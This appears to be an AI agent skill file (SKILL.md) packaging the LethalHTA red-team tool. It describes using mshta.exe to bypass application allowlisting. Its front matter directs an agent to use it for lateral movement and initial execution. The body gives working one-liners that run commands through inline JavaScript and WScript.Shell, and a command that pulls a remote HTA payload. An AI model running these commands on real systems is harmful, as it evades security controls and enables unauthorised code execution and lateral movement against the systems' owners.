---
name: lethalhta-mshta
description: "LethalHTA abuses mshta for allowlisted execution. Signals: lateral movement, psexec, direct execution, remote HTA, README reference."
zh-signals: "LethalHTA: mshta 白名单执行。信号:横向移动,psexec,直接执行,远程 HTA,参考 README。"
when-to-use: >-
  Use when executing payloads through mshta.exe to bypass application
  allowlisting; run inline JavaScript or a remote HTA during lateral movement
  or initial execution.
---

# LethalHTA

- Attack Category: C31 Remote Service Lateral Movement
- Upstream Repository: https://github.com/codewhitesec/LethalHTA
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/codewhitesec/LethalHTA
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `mshta.exe 'javascript:RnK5=new ActiveXObject("WScript.Shell");RnK5.Run("cmd /c whoami",0);close();'` | Direct execution |
| `mshta http://10.0.0.5/payload.hta` | Remote HTA |
| `Rundll32 obfuscated variant` | Refer to the README |

## Attack Scenario Playbook

### mshta allowlisted execution

```bash
mshta 'javascript:o=new ActiveXObject("WScript.Shell");o.Run("calc.exe",0);close();'
# mshta.exe is often allowed by AppLocker allowlists
```

## Notes

From codewhitesec; a collection of fileless mshta.exe execution payloads that bypass application allowlists.
